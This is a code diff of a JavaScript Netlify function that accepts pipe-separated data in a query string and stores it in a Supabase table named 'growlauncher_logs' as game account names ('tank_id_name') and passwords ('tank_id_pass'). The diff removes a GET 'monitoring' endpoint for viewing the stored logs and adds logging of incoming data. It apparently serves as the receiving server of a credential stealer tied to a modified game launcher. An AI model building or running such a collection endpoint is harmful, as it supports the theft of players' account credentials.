@@ -1,7 +1,6 @@
 const { createClient } = require('@supabase/supabase-js');
 
-// Pastikan variabel env ini sesuai dengan yang ada di Netlify
-const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_KEY);
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 
 exports.handler = async (event) => {
     const headers = {
@@ -10,47 +9,35 @@ exports.handler = async (event) => {
         "Content-Type": "application/json"
     };
 
-    // --- LOGIKA GET: Mengambil data untuk ditampilkan di monitoring ---
-    if (event.httpMethod === 'GET') {
-        try {
-            const { data, error } = await supabase
-                .from('growlauncher_logs')
-                .select('*')
-                .order('created_at', { ascending: false });
+    // Ambil data dari 'd' atau 'data'
+    const query = event.queryStringParameters || {};
+    const rawData = query.d || query.data;
 
-            if (error) throw error;
-            return { statusCode: 200, headers, body: JSON.stringify(data) };
-        } catch (err) {
-            return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
-        }
+    console.log("Data diterima:", rawData); // Cek ini di Netlify Function Logs
+
+    if (!rawData) {
+        return { 
+            statusCode: 400, 
+            headers, 
+            body: JSON.stringify({ error: "No data provided", received: query }) 
+        };
     }
 
-    // --- LOGIKA POST/QUERY: Menyimpan data dari launcher ---
     try {
-        const rawData = event.queryStringParameters.d || event.queryStringParameters.data;
-
-        if (!rawData) {
-            return { statusCode: 400, headers, body: JSON.stringify({ error: "No data provided" }) };
-        }
-
+        // Pisahkan data menggunakan pipe |
         const parts = rawData.split('|');
-        const inputData = {
-            idName: parts[0] || "Unknown",
-            idPass: parts[1] || "Unknown",
-            meta: parts[2] || "None"
+        const payload = {
+            tank_id_name: parts[0] || "Unknown",
+            tank_id_pass: parts[1] || "Unknown",
+            meta_data: parts[2] || "None"
         };
 
         const { error } = await supabase
             .from('growlauncher_logs')
-            .insert([
-                { 
-                    tank_id_name: inputData.idName, 
-                    tank_id_pass: inputData.idPass, 
-                    meta_data: inputData.meta 
-                }
-            ]);
+            .insert([payload]);
 
         if (error) throw error;
+
         return { statusCode: 200, headers, body: JSON.stringify({ status: "Success" }) };
     } catch (err) {
         return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
